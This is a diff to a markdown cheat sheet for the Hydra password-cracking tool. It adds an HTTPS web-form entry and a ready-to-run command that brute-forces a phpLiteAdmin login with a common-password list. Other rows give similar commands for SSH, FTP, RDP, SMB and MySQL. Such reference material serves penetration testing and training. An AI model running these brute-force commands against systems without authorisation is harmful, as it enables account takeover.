@@ -43,7 +43,8 @@ hydra [login_options] [password_options] [attack_options] [service_options]
 | `ssh` | SSH | `hydra -l root -P pass.txt ssh://192.168.1.100` |
 | `ftp` | FTP | `hydra -l admin -P pass.txt ftp://192.168.1.100` |
 | `http-get` | HTTP Basic Auth | `hydra -L users.txt -P pass.txt example.com http-get /` |
-| `http-post-form` | Web Login Form | See below |
+| `http-post-form` | Web Login Form (HTTP) | See below |
+| `https-post-form` | Web Login Form (HTTPS) | Same syntax as http-post-form, use for HTTPS |
 | `rdp` | Remote Desktop | `hydra -l admin -P pass.txt rdp://192.168.1.100` |
 | `smb` | SMB | `hydra -l admin -P pass.txt 192.168.1.100 smb` |
 | `mysql` | MySQL | `hydra -l root -P pass.txt mysql://192.168.1.100` |
@@ -109,6 +110,8 @@ hydra [options] target http-post-form "path:params:condition_string"
 
 ```bash
 hydra -l admin -P pass.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
+# HTTPS form (e.g. phpLiteAdmin), limit threads for stability
+hydra -l admin -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt TARGET_IP https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -t 3
 ```
 
 **Use `S=` when you know what success looks like:**
